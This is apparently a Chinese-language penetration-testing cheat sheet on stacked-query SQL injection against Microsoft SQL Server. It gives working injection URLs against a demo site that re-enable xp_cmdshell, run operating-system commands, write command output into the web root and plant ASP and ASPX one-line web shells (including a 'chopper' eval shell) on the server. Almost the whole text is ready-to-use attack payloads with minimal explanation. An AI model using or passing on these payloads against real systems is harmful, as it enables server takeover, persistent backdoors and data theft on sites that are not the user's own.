在SQLSERVER中是可以执行多行操作的；两条SQL语句是用分号隔开

```sql
select * from art; select * from admin
```

xp_cmdshell默认在mssql2000中是开启的，在mssql2005之后的版本中则默认禁止。

如果用户拥有管理员sa权限则可以用sp_configure 重新开启它。

```http
;EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE; 
```

命令解释

EXEC sp_configure 'show advanced options',1   //允许修改高级参数
RECONFIGUREEXEC sp_configure 'xp_cmdshell',1  //打开xp_cmdshell扩展RECONFIGURE

执行系统命令(页面不显示)

```http
http://www.demo1.com/index.aspx?id=1;EXEC master.dbo.xp_cmdshell 'ipconfig'
```

开启xp_cmdshell

```http
http://www.demo1.com/index.aspx?id=1;EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;
```

 getshell 

```http
http://www.demo1.com/index.aspx?id=1;exec master..xp_cmdshell 'echo ^<%eval request(chr(35))%^> > C:\inetpub\wwwroot\www.demo1.com\2.asp' --  

http://www.demo1.com/index.aspx?id=1;exec master..xp_cmdshell 'echo ^<%@ Page Language="Jscript"%^>^<%eval(Request.Item["chopper"],"unsafe");%^>>C:\inetpub\wwwroot\www.demo1.com\2.aspx' --
```

执行系统命令 把命令结果输出到指定文件

```http
http://www.demo1.com/index.aspx?id=1;EXEC master.dbo.xp_cmdshell 'ipconfig >>C:\inetpub\wwwroot\www.demo1.com\ip.txt'
```

 